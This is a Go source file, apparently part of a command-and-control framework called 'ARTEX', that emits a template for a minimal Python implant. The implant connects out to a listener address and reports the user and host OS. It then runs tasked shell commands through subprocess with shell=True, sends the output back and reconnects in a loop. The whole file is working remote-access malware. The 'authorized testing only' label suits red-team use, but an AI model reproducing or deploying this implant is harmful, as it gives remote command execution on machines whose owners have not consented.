package c2

// 载荷：生成植入端脚本模板（Python，最小实现，便于内网快速验证）。
// 模板只包含与平台协议一致的最小逻辑：上线 → 收任务 → 执行 → 回结果 → 心跳。

import "fmt"

// PythonImplant 返回一个最小 Python 植入端脚本模板。
func PythonImplant(listenerAddr, token, keyB64, implantID string) string {
	return fmt.Sprintf(pyImplantTmpl, listenerAddr, token, keyB64, implantID)
}

const pyImplantTmpl = `#!/usr/bin/env python3
# ARTEX C2 minimal implant (authorized testing only)
import base64, json, os, socket, struct, subprocess, threading, time

ADDR = %q
TOKEN = %q
KEY = base64.b64decode(%q)
IMPLANT_ID = %q

def frame(t, i, p):
    return struct.pack(">IBI", 5 + len(p), t, i) + p

def read_frame(sock):
    hdr = b""
    while len(hdr) < 9:
        b = sock.recv(9 - len(hdr))
        if not b:
            raise ConnectionError("closed")
        hdr += b
    ln, typ, fid = struct.unpack(">IBI", hdr)
    body = b""
    while len(body) < ln - 5:
        b = sock.recv(ln - 5 - len(body))
        if not b:
            raise ConnectionError("closed")
        body += b
    return typ, fid, body

# GCM envelope over raw socket is non-trivial in stdlib; this template uses
# AES-GCM via cryptography when available, otherwise falls back to plaintext
# JSON (lab-only; do not use plaintext mode outside an isolated lab).
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    _GCM = AESGCM(KEY)
except Exception:
    _GCM = None

def seal(plain):
    if _GCM is None:
        return plain
    nonce = os.urandom(12)
    return nonce + _GCM.encrypt(nonce, plain, None)

def open_(blob):
    if _GCM is None:
        return blob
    return _GCM.decrypt(blob[:12], blob[12:], None)

def main():
    while True:
        try:
            sock = socket.create_connection(tuple(ADDR.rsplit(":", 1)[0:1]) + (int(ADDR.rsplit(":", 1)[1]),), timeout=30)
            hello = {"token": TOKEN, "key": base64.b64encode(KEY).decode(), "id": IMPLANT_ID,
                     "os": os.name, "arch": "py", "user": os.getenv("USER", "")}
            sock.sendall(frame(1, 0, json.dumps(hello).encode()))
            ty, fid, body = read_frame(sock)
            while True:
                try:
                    ty, fid, body = read_frame(sock)
                except ConnectionError:
                    break
                if ty == 3:
                    task = json.loads(open_(body))
                    try:
                        out = subprocess.run(task.get("args", ""), shell=True, capture_output=True, timeout=task.get("timeout_sec", 60))
                        res = {"task_id": fid, "exit_code": out.returncode, "output": (out.stdout + out.stderr).decode(errors="replace")}
                    except Exception as e:
                        res = {"task_id": fid, "exit_code": -1, "output": "", "err": str(e)}
                    sock.sendall(frame(4, fid, seal(json.dumps(res).encode())))
                elif ty == 5:
                    pass
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    main()
`
